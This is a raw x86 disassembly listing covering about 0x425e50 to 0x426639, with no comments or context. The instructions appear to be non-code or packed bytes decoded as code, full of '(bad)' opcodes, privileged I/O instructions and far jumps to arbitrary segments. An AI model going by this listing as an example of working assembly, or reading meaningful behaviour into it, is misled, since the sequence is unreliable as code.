  425e50:	mov    dl,0x5a
  425e52:	fsub   QWORD PTR [edx-0x61]
  425e55:	fldenv [eax]
  425e57:	pop    eax
  425e58:	test   DWORD PTR [edi+edi*2-0x1c],esi
  425e5c:	ja     0x425e18
  425e5e:	nop
  425e5f:	fst    DWORD PTR [ebp-0x63]
  425e62:	in     eax,dx
  425e63:	pushf  
  425e64:	mov    BYTE PTR [ebx-0x4e],dh
  425e67:	repz test DWORD PTR [edi+eiz*4-0x5f1eaf62],ecx
  425e6f:	aam    0x4e
  425e71:	mov    ch,0x6b
  425e73:	fwait
  425e74:	pop    eax
  425e75:	scas   eax,DWORD PTR es:[edi]
  425e76:	stc    
  425e77:	pop    ebx
  425e78:	jp     0x425e9d
  425e7a:	stos   BYTE PTR es:[edi],al
  425e7b:	push   edx
  425e7c:	inc    ecx
  425e7d:	inc    eax
  425e7e:	pop    ebp
  425e7f:	into   
  425e80:	mov    esp,DWORD PTR [eax]
  425e82:	jae    0x425ed7
  425e84:	dec    ebp
  425e85:	icebp  
  425e86:	lods   al,BYTE PTR ds:[esi]
  425e87:	mov    WORD PTR [esi+ebp*1-0x33],es
  425e8b:	arpl   WORD PTR [edi+ebp*8],ax
  425e8e:	push   0x5da92b15
  425e93:	sti    
  425e94:	pop    ecx
  425e95:	dec    ebx
  425e96:	xor    ah,BYTE PTR [edi+0x37]
  425e99:	std    
  425e9a:	cmp    ebp,ebp
  425e9c:	mov    cs,WORD PTR [ebx-0x1c97dc2c]
  425ea2:	psadbw mm3,QWORD PTR [ecx-0x2a273da1]
  425ea9:	loopne 0x425efd
  425eab:	mov    BYTE PTR [ecx],dl
  425ead:	aam    0x53
  425eaf:	add    bh,bh
  425eb1:	cdq    
  425eb2:	xchg   ebx,eax
  425eb3:	and    edx,DWORD PTR [ecx]
  425eb5:	jns    0x425e41
  425eb7:	cmp    al,0x4a
  425eb9:	enter  0x8e0d,0x57
  425ebd:	icebp  
  425ebe:	inc    esp
  425ebf:	(bad)  
  425ec0:	sub    DWORD PTR [edx],0xe402cfe4
  425ec6:	retf   0xc4fe
  425ec9:	in     eax,dx
  425eca:	lods   eax,DWORD PTR ds:[esi]
  425ecb:	ins    BYTE PTR es:[edi],dx
  425ecc:	out    dx,eax
  425ecd:	retf   0xd27a
  425ed0:	push   ebp
  425ed1:	sbb    BYTE PTR [edi+eax*8+0x27008f64],cl
  425ed8:	mov    DWORD PTR [esi+ecx*2],esi
  425edb:	adc    al,0xe5
  425edd:	dec    edi
  425ede:	cmc    
  425edf:	sub    eax,0xa4a468a1
  425ee4:	outs   dx,BYTE PTR ds:[esi]
  425ee5:	or     dl,0xb0
  425ee8:	sub    eax,DWORD PTR [ecx]
  425eea:	pop    eax
  425eeb:	stos   DWORD PTR es:[edi],eax
  425eec:	mov    DWORD PTR [edi+0x2db8a102],edi
  425ef2:	ret    0x2aee
  425ef5:	aad    0xe2
  425ef7:	inc    edi
  425ef8:	cmp    DWORD PTR [edx+0x39bca880],edi
  425efe:	sub    bh,bl
  425f00:	pusha  
  425f01:	das    
  425f02:	pop    esi
  425f03:	shl    BYTE PTR [edx-0x39fde354],cl
  425f09:	pusha  
  425f0a:	mov    ah,0x14
  425f0c:	ret    0x1332
  425f0f:	push   ebx
  425f10:	gs pop edi
  425f12:	dec    ebp
  425f13:	sub    ah,dl
  425f15:	sub    bh,BYTE PTR ds:0x50e27958
  425f1b:	xchg   BYTE PTR [edx+0x6d4fabbb],dh
  425f21:	cmp    DWORD PTR [esi+0x1b482e1c],ebx
  425f27:	les    eax,FWORD PTR [eax+0x3]
  425f2a:	pop    ds
  425f2b:	jae    0x425f7b
  425f2d:	cmc    
  425f2e:	push   esi
  425f2f:	out    0xc1,eax
  425f31:	jns    0x425f60
  425f33:	repz xor ch,BYTE PTR [edi]
  425f36:	es inc esi
  425f38:	jmp    FWORD PTR [edi]
  425f3a:	inc    eax
  425f3b:	pop    ecx
  425f3c:	jg     0x425f8c
  425f3e:	or     BYTE PTR cs:[edx+ecx*2],dl
  425f42:	hlt    
  425f43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f44:	xchg   DWORD PTR [esi],eax
  425f46:	ret    
  425f47:	inc    ecx
  425f48:	fdivr  QWORD PTR [eax-0x74b63d06]
  425f4e:	and    al,0x8f
  425f50:	icebp  
  425f51:	data16 jbe 0x425fac
  425f54:	retf   
  425f55:	mov    dh,0x8c
  425f57:	js     0x425fa7
  425f59:	not    BYTE PTR [esp+ecx*8+0x23402532]
  425f60:	and    BYTE PTR [edi-0x2f],cl
  425f63:	cmp    BYTE PTR [eax+0x18],0x98
  425f67:	adc    bh,al
  425f69:	rcl    ebp,cl
  425f6b:	ret    
  425f6c:	(bad)  
  425f6d:	retf   0xe37d
  425f70:	push   ebp
  425f71:	dec    ebp
  425f72:	cmp    BYTE PTR [ebx-0x50eaa3f4],bh
  425f78:	dec    esi
  425f79:	mov    esi,0x55f0f3eb
  425f7e:	adc    al,0x26
  425f80:	fidivr DWORD PTR [eax+0x1d2b3ad0]
  425f86:	pop    ebx
  425f87:	fwait
  425f88:	add    al,0x2
  425f8a:	jnp    0x425fde
  425f8c:	(bad)  
  425f8d:	in     eax,dx
  425f8e:	js     0x425f26
  425f90:	add    eax,ebx
  425f92:	sub    DWORD PTR [ecx-0x7b],ebp
  425f95:	xchg   BYTE PTR [esp+ebp*8-0x1c67a4a],bl
  425f9c:	stos   BYTE PTR es:[edi],al
  425f9d:	adc    al,0x74
  425f9f:	stos   BYTE PTR es:[edi],al
  425fa0:	sbb    eax,0x21dbef7a
  425fa5:	scas   al,BYTE PTR es:[edi]
  425fa6:	xchg   edx,eax
  425fa7:	std    
  425fa8:	lahf   
  425fa9:	add    BYTE PTR [edx+0x7fb0e4ec],al
  425faf:	cwde   
  425fb0:	add    eax,0x2e382198
  425fb5:	imul   ecx,DWORD PTR [edx+ebp*8+0x29c45b46],0x8679c363
  425fc0:	mov    edx,DWORD PTR [esp+esi*8+0x26d92f5f]
  425fc7:	sbb    esi,DWORD PTR [ebp+0x51]
  425fca:	aas    
  425fcb:	repz jne 0x425f70
  425fce:	das    
  425fcf:	or     BYTE PTR [ecx-0x1a],dl
  425fd2:	inc    ecx
  425fd3:	into   
  425fd4:	jl     0x425fa8
  425fd6:	adc    eax,0xf81cd863
  425fdb:	jge    0x425fb6
  425fdd:	xlat   BYTE PTR ds:[ebx]
  425fde:	push   eax
  425fdf:	mov    edx,DWORD PTR [eax-0xbf26447]
  425fe5:	inc    edi
  425fe6:	adc    al,0x9a
  425fe9:	dec    ebx
  425fea:	xlat   BYTE PTR ds:[ebx]
  425feb:	out    dx,al
  425fec:	clc    
  425fed:	ins    BYTE PTR es:[edi],dx
  425fee:	mov    bl,0x7
  425ff0:	ret    0xf481
  425ff3:	out    dx,al
  425ff4:	push   cs
  425ff5:	push   edi
  425ff6:	dec    edx
  425ff7:	punpckldq mm3,DWORD PTR [edi+ebp*2-0x2028d9fa]
  425fff:	jb     0x426046
  426001:	in     eax,0x6c
  426003:	adc    eax,DWORD PTR [ebx-0x7e]
  426006:	sbb    ecx,DWORD PTR [edi+edx*8+0x7f]
  42600a:	cdq    
  42600b:	retf   
  42600c:	fmul   DWORD PTR [edi+0x3c83b1ec]
  426012:	arpl   WORD PTR [edx+0x3],bp
  426015:	je     0x426039
  426017:	sub    cl,BYTE PTR [ebx+0x1517dbd4]
  42601d:	ss mov ch,0x77
  426020:	cmp    eax,0x4ee46341
  426025:	int3   
  426026:	mov    ch,0x11
  426028:	sub    al,0xe4
  42602a:	mov    esi,0xbfce2aca
  42602f:	mul    BYTE PTR [edi]
  426031:	fdiv   QWORD PTR [eax-0x7b9f3dec]
  426037:	xchg   esp,eax
  426038:	inc    edx
  426039:	sbb    al,0x2d
  42603b:	jg     0x425fe9
  42603d:	xchg   edx,eax
  42603e:	rol    DWORD PTR ds:0xe3e29aec,0x13
  426045:	dec    ebx
  426046:	shr    DWORD PTR [eax-0x31d5d15f],cl
  42604c:	jecxz  0x426072
  42604e:	jmp    0xf36a:0x395e7a41
  426055:	mov    DWORD PTR [ecx],ecx
  426057:	mov    ecx,0x9215fa0
  42605c:	bound  ecx,QWORD PTR [edi]
  42605e:	pop    ebp
  42605f:	pop    eax
  426060:	mov    dh,0x7a
  426062:	popa   
  426063:	test   BYTE PTR [edx],dh
  426065:	popa   
  426066:	mov    WORD PTR [eax-0x61],?
  426069:	cld    
  42606a:	frstor [esi+0x4ce411bd]
  426070:	shl    DWORD PTR [ecx],cl
  426072:	add    edi,ebp
  426074:	imul   ebx,DWORD PTR ds:0x77092e4,0xd553c470
  42607e:	sub    BYTE PTR [edi],dl
  426080:	and    BYTE PTR [edx],0xa1
  426083:	imul   ebp,DWORD PTR [ebx+0x51c1c537],0x73
  42608a:	cmp    ecx,DWORD PTR [ebx-0x75473696]
  426090:	(bad)  
  426091:	in     eax,0x33
  426093:	xchg   dh,ch
  426095:	aaa    
  426096:	scas   eax,DWORD PTR es:[edi]
  426097:	mov    DWORD PTR [edi+eiz*4+0x78b1f40],esp
  42609e:	cmp    DWORD PTR [ecx-0x33],0x3f
  4260a2:	inc    esi
  4260a3:	mov    ds:0x9c92f5b9,al
  4260a8:	int3   
  4260a9:	fsubr  DWORD PTR [ebp-0x17]
  4260ac:	test   BYTE PTR [ecx-0x4c],ah
  4260af:	jnp    0x42603a
  4260b1:	cmp    ah,BYTE PTR [edi-0x1a]
  4260b4:	mov    bh,0x2b
  4260b6:	sbb    BYTE PTR [ebp+0x665fe68],dl
  4260bc:	ja     0x4260a9
  4260be:	retf   
  4260bf:	push   esp
  4260c0:	dec    edi
  4260c1:	es cdq 
  4260c3:	pop    edx
  4260c4:	dec    ebx
  4260c5:	test   BYTE PTR [edi-0x22],bh
  4260c8:	stos   DWORD PTR es:[edi],eax
  4260c9:	adc    dl,BYTE PTR [edx]
  4260cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4260cc:	xor    DWORD PTR [edx-0x1bf6ec34],esp
  4260d2:	jle    0x426150
  4260d4:	xchg   ebp,eax
  4260d5:	xor    al,BYTE PTR [esi]
  4260d7:	cs psubb mm1,mm2
  4260db:	test   BYTE PTR [ebp-0x3f],0xb4
  4260df:	(bad)  
  4260e1:	std    
  4260e2:	dec    edi
  4260e3:	cmp    bl,bh
  4260e5:	cs mov cl,0x5f
  4260e8:	mov    eax,DWORD PTR [esi+0x7a]
  4260eb:	and    al,0x6a
  4260ed:	jbe    0x4260aa
  4260ef:	xchg   edx,eax
  4260f0:	mov    dl,0x26
  4260f2:	ins    BYTE PTR es:[edi],dx
  4260f3:	jo     0x4260ac
  4260f5:	adc    cl,BYTE PTR [esi-0x397fe4aa]
  4260fb:	and    eax,0x92504c4
  426100:	test   eax,0xb4d091be
  426105:	idiv   BYTE PTR [ebp-0x6cadfc22]
  42610b:	lods   al,BYTE PTR ds:[esi]
  42610c:	mov    ah,0x20
  42610e:	hlt    
  42610f:	jge    0x426188
  426111:	cmp    dh,BYTE PTR [esi-0x281cba33]
  426117:	add    DWORD PTR [eax],edi
  426119:	push   cs
  42611a:	ds adc eax,0x2721f52a
  426120:	xchg   esi,eax
  426121:	or     bh,ch
  426123:	add    bl,BYTE PTR [eax+0x7]
  426126:	adc    bl,BYTE PTR [ebx-0x52]
  426129:	inc    eax
  42612a:	add    al,0x18
  42612c:	aad    0xa8
  42612e:	inc    eax
  42612f:	ffree  st(5)
  426131:	(bad)  
  426132:	pop    ds
  426133:	cwde   
  426134:	fwait
  426135:	sahf   
  426136:	sub    BYTE PTR [esi+0x67],bl
  426139:	mov    bl,0x5b
  42613b:	jmp    0xe7808b82
  426140:	xor    al,ah
  426142:	into   
  426143:	xchg   edx,eax
  426144:	loop   0x42616f
  426146:	add    eax,ecx
  426148:	repz out 0xf,al
  42614b:	cs in  eax,0x8c
  42614e:	adc    BYTE PTR [edx],0xc2
  426151:	ins    BYTE PTR es:[edi],dx
  426152:	in     al,dx
  426153:	jle    0x426191
  426155:	aam    0xb2
  426157:	loop   0x426121
  426159:	mov    ds,WORD PTR [esi]
  42615b:	rol    eax,cl
  42615d:	dec    ecx
  42615e:	and    dl,BYTE PTR [ebx-0x29c079ed]
  426164:	mov    ds:0x7360a5bb,al
  426169:	idiv   BYTE PTR [esi+0x8]
  42616c:	ss xchg esi,eax
  42616e:	ja     0x4261bf
  426170:	pop    ebx
  426171:	and    al,0x9e
  426173:	popf   
  426174:	pop    ss
  426175:	lahf   
  426176:	leave  
  426177:	ret    
  426178:	test   BYTE PTR [esi-0x2158323a],ch
  42617e:	xlat   BYTE PTR ds:[ebx]
  42617f:	loop   0x42611a
  426181:	pop    ss
  426182:	sar    DWORD PTR [edi+ebx*4+0x3cf55927],0x6b
  42618a:	icebp  
  42618b:	mov    eax,0x9753c081
  426190:	and    DWORD PTR [ebx+0x2e50fdbc],edi
  426196:	mov    edi,0x4a31b597
  42619b:	ins    DWORD PTR es:[edi],dx
  42619c:	mov    fs,WORD PTR [edi+esi*2+0x24]
  4261a0:	rcl    BYTE PTR [edi],1
  4261a2:	or     DWORD PTR [esi+ebp*2-0x988318],edi
  4261a9:	leave  
  4261aa:	xchg   esp,eax
  4261ab:	jne    0x426178
  4261ad:	mov    al,0x72
  4261af:	xor    eax,0xdfd68c03
  4261b4:	in     eax,0xe0
  4261b6:	mov    esp,DWORD PTR [ebx+0x1fa0f0cf]
  4261bc:	out    0xcf,al
  4261be:	lods   al,BYTE PTR ds:[esi]
  4261bf:	push   esp
  4261c0:	adc    al,0xbd
  4261c2:	mov    ch,0xea
  4261c4:	mov    bh,0x86
  4261c6:	pop    esi
  4261c7:	jmp    0xfd8f:0x6660cce4
  4261ce:	inc    ecx
  4261cf:	(bad)  
  4261d0:	ins    DWORD PTR es:[edi],dx
  4261d1:	push   es
  4261d2:	inc    edi
  4261d3:	lds    ecx,FWORD PTR [edx-0x21]
  4261d6:	stc    
  4261d7:	int    0xbb
  4261d9:	jmp    0xd4f4:0xe288aaa4
  4261e0:	or     al,0x93
  4261e2:	scas   al,BYTE PTR es:[edi]
  4261e3:	push   edx
  4261e4:	sbb    DWORD PTR [edi],edx
  4261e6:	sbb    al,0x91
  4261e8:	outs   dx,DWORD PTR ds:[esi]
  4261e9:	test   BYTE PTR [ecx-0x3f4794cc],dl
  4261ef:	inc    esp
  4261f0:	adc    al,0xf0
  4261f2:	scas   al,BYTE PTR es:[edi]
  4261f3:	xchg   DWORD PTR [esi-0x41],ecx
  4261f6:	jg     0x42618a
  4261f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4261f9:	(bad)  [ebp-0x7e]
  4261fc:	ja     0x42621b
  4261fe:	call   0xf3cb:0xeabc995b
  426205:	dec    ebx
  426206:	cwde   
  426207:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426208:	gs sbb al,0x4
  42620b:	inc    ebp
  42620c:	mov    cl,0xe4
  42620e:	dec    ecx
  42620f:	pop    ebp
  426210:	sbb    ebp,DWORD PTR [edx-0x37]
  426213:	ja     0x426257
  426215:	iret   
  426216:	and    ecx,DWORD PTR [edi+0x338e3edf]
  42621c:	sbb    BYTE PTR [ecx],ch
  42621e:	pop    ds
  42621f:	pusha  
  426220:	es jecxz 0x426268
  426223:	push   0x6b31db12
  426228:	lea    esi,[ebx+0x5f798791]
  42622e:	push   ds
  42622f:	inc    ebx
  426230:	add    ch,BYTE PTR [bp+si+0x42]
  426234:	push   DWORD PTR [edi]
  426236:	jle    0x426294
  426238:	cld    
  426239:	aaa    
  42623a:	mov    al,0x5b
  42623c:	leave  
  42623d:	jecxz  0x42625c
  42623f:	sahf   
  426240:	das    
  426241:	cmc    
  426242:	shl    DWORD PTR ds:0xd2a8304b,cl
  426248:	adc    al,al
  42624a:	das    
  42624b:	out    dx,al
  42624c:	cmp    edi,DWORD PTR [eax]
  42624e:	fild   QWORD PTR [edx+0x2]
  426251:	test   DWORD PTR [edx+0x27453a6b],0x45cf798f
  42625b:	push   esi
  42625c:	cmp    ch,BYTE PTR [edi+0x3b]
  42625f:	sub    eax,0x657d783b
  426264:	scas   eax,DWORD PTR es:[edi]
  426265:	int3   
  426266:	push   es
  426267:	xchg   cl,ch
  426269:	repz xchg esi,eax
  42626b:	sbb    eax,0xfb228ec2
  426270:	das    
  426271:	sub    eax,0x7cec4d30
  426276:	out    dx,al
  426277:	retf   
  426278:	or     ebx,0x215fce75
  42627e:	add    BYTE PTR [eax],al
  426280:	add    BYTE PTR [eax],al
  426282:	jno    0x426247
  426284:	loop   0x426271
  426286:	bnd jmp 0x426302
  426289:	fcomi  st,st(7)
  42628b:	mov    edi,db7
  42628e:	and    eax,0xfdb7570f
  426293:	fiadd  DWORD PTR [ecx]
  426295:	add    ah,dh
  426297:	add    al,0x0
  426299:	add    BYTE PTR [ebp+0x2b8cde02],bl
  42629f:	leave  
  4262a0:	imul   ebx,eax,0xffffffc7
  4262a3:	jge    0x4262a9
  4262a5:	jmp    0x42628d
  4262a7:	dec    edx
  4262a8:	cmp    eax,0xeaca54ff
  4262ad:	ja     0x426232
  4262af:	push   cs
  4262b0:	pop    ebp
  4262b1:	mov    esi,0x97619e05
  4262b6:	(bad)  ds:0x22883b7c
  4262bc:	popa   
  4262bd:	push   ecx
  4262be:	fcmovnb st,st(3)
  4262c0:	inc    esi
  4262c1:	fcomp  QWORD PTR [ebp+0x9]
  4262c4:	(bad)  
  4262c5:	aas    
  4262c6:	out    dx,eax
  4262c7:	je     0x42625e
  4262c9:	xor    eax,0xf58e7192
  4262ce:	out    dx,al
  4262cf:	xchg   esp,eax
  4262d0:	sahf   
  4262d1:	pop    ebx
  4262d2:	gs jne 0x426293
  4262d5:	jp     0x426337
  4262d7:	in     eax,0xfe
  4262d9:	bound  eax,QWORD PTR [esi+0x44]
  4262dc:	jle    0x4262ec
  4262de:	leave  
  4262df:	js     0x426313
  4262e1:	mov    edx,0x2a7d94ce
  4262e6:	add    al,0x86
  4262e8:	mov    bl,0xf
  4262ea:	push   edx
  4262eb:	dec    ebx
  4262ec:	xor    DWORD PTR [esi+ecx*4],0x46
  4262f0:	or     DWORD PTR [eax+0x4afb0e51],ebx
  4262f6:	inc    ebp
  4262f7:	in     eax,dx
  4262f8:	inc    edx
  4262f9:	sahf   
  4262fa:	into   
  4262fb:	mov    ecx,fs
  4262fd:	sar    ch,0x63
  426300:	mov    DWORD PTR [esi],ebx
  426302:	stos   BYTE PTR es:[edi],al
  426303:	mov    fs,ebx
  426305:	int3   
  426306:	(bad)  
  426308:	xor    al,cl
  42630a:	imul   bl
  42630c:	jnp    0x426305
  42630e:	or     DWORD PTR [edx],ebx
  426310:	push   cs
  426311:	inc    ebp
  426312:	dec    eax
  426313:	out    dx,eax
  426314:	mov    esp,0x58ff0e17
  426319:	sub    al,0x67
  42631b:	sub    al,0x70
  42631d:	push   edi
  42631e:	loop   0x4262be
  426320:	lea    eax,[edx]
  426322:	ins    DWORD PTR es:[edi],dx
  426323:	out    dx,al
  426324:	call   0xc117:0x1cbca364
  42632b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42632c:	pop    ecx
  42632d:	push   edi
  42632e:	daa    
  42632f:	or     BYTE PTR [edi-0x74],0xda
  426333:	mov    edi,0x97e50dae
  426338:	lahf   
  426339:	push   esi
  42633a:	(bad)  
  42633b:	mov    ebx,DWORD PTR [edx+0x503fa318]
  426341:	repnz call 0x68d4:0x4652dba4
  426349:	pop    eax
  42634a:	test   BYTE PTR [eax],0x29
  42634d:	lea    eax,[ecx+0x1eef071e]
  426353:	adc    esp,DWORD PTR [ecx+0x68]
  426356:	dec    ebp
  426357:	sbb    al,0xe9
  426359:	repnz mov cl,0x54
  42635c:	lock dec esi
  42635e:	add    al,0xcb
  426360:	mov    esp,0x1078463d
  426365:	ds cs aas 
  426368:	dec    ebx
  426369:	pop    ebp
  42636a:	shr    ch,cl
  42636c:	jmp    0x426321
  42636e:	daa    
  42636f:	call   0x5aa3:0x55ca0c50
  426376:	xor    DWORD PTR [ebp+0x16],ebx
  426379:	addr16 loope 0x42637e
  42637c:	and    DWORD PTR ds:0x82503530,eax
  426382:	adc    eax,eax
  426384:	dec    esp
  426385:	jmp    0x97b5:0xf7d79ed7
  42638c:	and    BYTE PTR [edx+0x1c],al
  42638f:	xor    al,0x48
  426391:	and    esp,DWORD PTR [ecx-0x61]
  426394:	jae    0x426323
  426396:	dec    ebx
  426397:	inc    esi
  426398:	jge    0x4263b0
  42639a:	push   ebx
  42639b:	lahf   
  42639c:	retf   
  42639d:	int    0xb
  42639f:	fst    st(6)
  4263a1:	mov    esp,0xa830de4
  4263a6:	cs addr16 popa 
  4263a9:	and    eax,DWORD PTR [eax]
  4263ab:	mov    DWORD PTR [esi-0x27722b6a],eax
  4263b1:	test   dh,bh
  4263b3:	call   0xb96:0x214895c1
  4263ba:	pop    esi
  4263bb:	xchg   esp,eax
  4263bc:	mov    esp,0x25b3cfb4
  4263c1:	mov    ebx,0xe7f6d445
  4263c6:	jne    0x4263bc
  4263c8:	push   ebx
  4263c9:	fistp  WORD PTR [edx+0x58de9176]
  4263cf:	scas   eax,DWORD PTR es:[edi]
  4263d0:	ret    
  4263d1:	je     0x42642b
  4263d3:	xor    edx,ebx
  4263d5:	xor    DWORD PTR [edx+0x53cd55b7],0x4ae6967b
  4263df:	adc    al,0x3e
  4263e1:	mov    ebp,0x21f9c70c
  4263e6:	mov    ds:0x26b400df,eax
  4263eb:	stc    
  4263ec:	or     al,0x5f
  4263ee:	or     BYTE PTR [edi+0x340f1bdc],0x88
  4263f5:	push   esi
  4263f6:	push   cs
  4263f7:	mov    dl,0x61
  4263f9:	stos   BYTE PTR es:[edi],al
  4263fa:	dec    esp
  4263fb:	pop    ebp
  4263fc:	mov    WORD PTR [ebp-0x30],cs
  4263ff:	out    dx,al
  426400:	push   edx
  426401:	mov    WORD PTR [esi-0x4f16df64],?
  426407:	(bad)  
  426409:	pop    ebp
  42640a:	addr16 ret 
  42640c:	xor    eax,0x1f99d2e3
  426411:	fwait
  426412:	scas   eax,DWORD PTR es:[edi]
  426413:	sub    DWORD PTR [edi-0x72],eax
  426416:	pop    edx
  426417:	cmp    ebx,DWORD PTR ds:0x6d14e9ab
  42641d:	xor    dh,BYTE PTR [ebx+ebp*4+0x17cc5779]
  426424:	sub    edx,esi
  426426:	inc    edx
  426427:	lods   eax,DWORD PTR ds:[esi]
  426428:	mov    al,dh
  42642a:	mov    esp,0x9f59125a
  42642f:	push   0x3d
  426431:	add    al,0x13
  426433:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426434:	xchg   ecx,eax
  426435:	pushf  
  426436:	pushf  
  426437:	xchg   DWORD PTR [ebp-0x30627744],ebx
  42643d:	inc    eax
  42643e:	(bad)  
  42643f:	jecxz  0x4264c0
  426441:	test   ebx,eax
  426443:	mul    DWORD PTR [edx+0x3e]
  426446:	jnp    0x426414
  426448:	add    edi,edx
  42644a:	sub    eax,0x331263fd
  42644f:	jbe    0x426473
  426451:	jle    0x426451
  426453:	imul   edi,DWORD PTR [esi-0x32],0xffffff95
  426457:	ins    DWORD PTR es:[edi],dx
  426458:	loope  0x42645a
  42645a:	and    eax,0x5b0f6eba
  426460:	cli    
  426461:	test   DWORD PTR [eiz*2+0x5bf59b94],edi
  426468:	hlt    
  426469:	cmc    
  42646a:	es (bad) 
  42646c:	inc    al
  42646e:	mov    DWORD PTR gs:[edi],esi
  426471:	mov    ah,0x74
  426473:	leave  
  426474:	movlps xmm4,QWORD PTR [ebx]
  426477:	jne    0x426413
  426479:	and    BYTE PTR [eax],0xcb
  42647c:	shr    DWORD PTR [edx-0x717aaf6f],cl
  426482:	add    ecx,ecx
  426484:	or     eax,0xdeffcb8f
  426489:	adc    DWORD PTR [eax-0x5ca5ddc7],0x20
  426490:	in     al,0x34
  426492:	add    DWORD PTR [ebx-0x2315a174],ecx
  426498:	popf   
  426499:	jp     0x426486
  42649b:	int3   
  42649c:	jmp    0x477364e1
  4264a1:	fst    DWORD PTR [eax+eax*1-0x3079a1c9]
  4264a8:	inc    ebp
  4264a9:	ja     0x426486
  4264ab:	add    bh,BYTE PTR ds:0xb76b7f14
  4264b1:	jl     0x42647b
  4264b3:	fadd   DWORD PTR [eax-0x56a056f9]
  4264b9:	(bad)  
  4264ba:	enter  0x4aaf,0xa4
  4264be:	push   0xda6831d1
  4264c3:	scas   eax,DWORD PTR es:[edi]
  4264c4:	jo     0x426466
  4264c6:	mov    al,0x6c
  4264c8:	jne    0x4264b8
  4264ca:	inc    eax
  4264cb:	sub    cl,al
  4264cd:	pop    esp
  4264ce:	out    0x1,eax
  4264d0:	sbb    bl,BYTE PTR ss:[ebp+0x43db376b]
  4264d7:	lods   eax,DWORD PTR es:[esi]
  4264d9:	cmp    eax,0xf4347d9e
  4264de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4264df:	sub    al,BYTE PTR [eax]
  4264e1:	pop    esi
  4264e2:	cld    
  4264e3:	mov    eax,0xad9e74f5
  4264e8:	add    eax,0x92db6dbd
  4264ed:	mov    DWORD PTR ds:0x5bb8a3f,ecx
  4264f3:	mov    eax,0x6c038ee9
  4264f8:	(bad)  
  4264f9:	inc    edx
  4264fa:	mov    esp,ecx
  4264fc:	daa    
  4264fd:	jns    0x426483
  4264ff:	push   eax
  426500:	test   DWORD PTR [ecx],0x88055426
  426506:	fisub  DWORD PTR [esi+0xf]
  426509:	popf   
  42650a:	sbb    BYTE PTR [ebp-0x63],ch
  42650d:	pop    eax
  42650e:	jo     0x426533
  426510:	jbe    0x4264b9
  426512:	outs   dx,BYTE PTR ds:[esi]
  426513:	retf   
  426514:	ds sub al,0x3d
  426517:	lock enter 0xdfc7,0x76
  42651c:	mov    edx,0x144c8886
  426521:	outs   dx,BYTE PTR ds:[esi]
  426522:	push   0x8bef6617
  426527:	inc    esi
  426528:	sbb    esp,DWORD PTR [esi+0x6]
  42652b:	stc    
  42652c:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  42652e:	fistp  WORD PTR [esi-0xc]
  426531:	ss mov ebp,0x32961ab3
  426537:	call   0x38a322b8
  42653c:	jno    0x426537
  42653e:	lock clc 
  426540:	stc    
  426541:	sbb    ch,ah
  426543:	and    al,dl
  426545:	data16 fist WORD PTR [eax-0x4e26e77a]
  42654c:	push   edx
  42654d:	rol    BYTE PTR [ecx],1
  42654f:	in     eax,0x2d
  426551:	mov    bh,dl
  426553:	repnz (bad)
  426557:	or     dl,BYTE PTR [esi+0x32]
  42655a:	mov    DWORD PTR [ecx+0x75856a7c],eax
  426560:	cmp    ebp,ebx
  426562:	jne    0x426563
  426564:	inc    edi
  426565:	and    al,0xce
  426567:	inc    eax
  426568:	neg    edi
  42656a:	or     DWORD PTR [edi+0x57],ebp
  42656d:	mov    dl,0x6d
  42656f:	sar    DWORD PTR [edi-0x4c52b758],cl
  426575:	cmp    edi,DWORD PTR [edx+0x11196ce9]
  42657b:	pop    eax
  42657c:	mov    bl,0x52
  42657e:	mov    dl,BYTE PTR [edx-0x4b3ea3c7]
  426584:	cmp    DWORD PTR [eax+0x3695b72a],0x3d4a59d8
  42658e:	ficom  WORD PTR [ebx-0x70063a43]
  426594:	sub    al,0x23
  426596:	je     0x426557
  426598:	out    0x28,al
  42659a:	mov    ds:0x6c185538,al
  42659f:	adc    cl,0xe6
  4265a2:	jb     0x426608
  4265a4:	call   0x39ac:0xb56b00c
  4265ab:	call   0x1183:0x5ee47401
  4265b2:	push   esp
  4265b3:	xchg   ebp,eax
  4265b4:	push   0xffffffcd
  4265b6:	loop   0x4265d3
  4265b8:	imul   esp,DWORD PTR [esi],0x32
  4265bb:	hlt    
  4265bc:	mov    DWORD PTR [esp+ebx*4-0x36133c8c],esp
  4265c3:	mov    ss,WORD PTR [edi]
  4265c5:	jnp    0x4265c1
  4265c7:	int    0xcb
  4265c9:	pushf  
  4265ca:	push   ebp
  4265cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4265cc:	aaa    
  4265cd:	ss mov ecx,0xd2375fe4
  4265d3:	imul   esi,DWORD PTR [eax],0x5a01d71
  4265d9:	(bad)  
  4265da:	rcl    ebx,1
  4265dc:	or     BYTE PTR [edx],0x99
  4265df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4265e0:	or     al,0x86
  4265e2:	fisttp QWORD PTR [ebx]
  4265e4:	loope  0x4265cd
  4265e6:	mov    edx,0xb5ac574
  4265eb:	repz lea ebp,[ebp+0x33]
  4265ef:	lods   eax,DWORD PTR ds:[esi]
  4265f0:	in     al,dx
  4265f1:	shl    BYTE PTR [edx],1
  4265f3:	mov    edi,0x96502f19
  4265f8:	sbb    dl,bl
  4265fa:	les    esp,FWORD PTR [edi+0x2c]
  4265fd:	add    BYTE PTR [esi+0x71],ch
  426600:	push   edi
  426601:	xchg   ebx,eax
  426602:	pop    esi
  426603:	pop    ss
  426604:	push   esi
  426605:	mul    BYTE PTR cs:[edi+0x36]
  426609:	aam    0x4c
  42660b:	cmp    DWORD PTR [eax],0xa96a6bee
  426611:	jmp    0x9f7a:0x9f65bbc7
  426618:	mov    ebx,0x25be8ed4
  42661d:	jns    0x426628
  42661f:	fist   WORD PTR [edi]
  426621:	mov    al,0x67
  426623:	stc    
  426624:	leave  
  426625:	add    bh,cl
  426627:	sub    ch,cl
  426629:	mov    cl,0x3
  42662b:	add    al,BYTE PTR [edi+0x31]
  42662e:	rcl    edx,1
  426630:	popf   
  426631:	pop    eax
  426632:	pop    ds
  426633:	pop    esi
  426634:	jge    0x4265c4
  426636:	pop    ebp
  426637:	sbb    dl,ch
  426639:	retf   0x6315
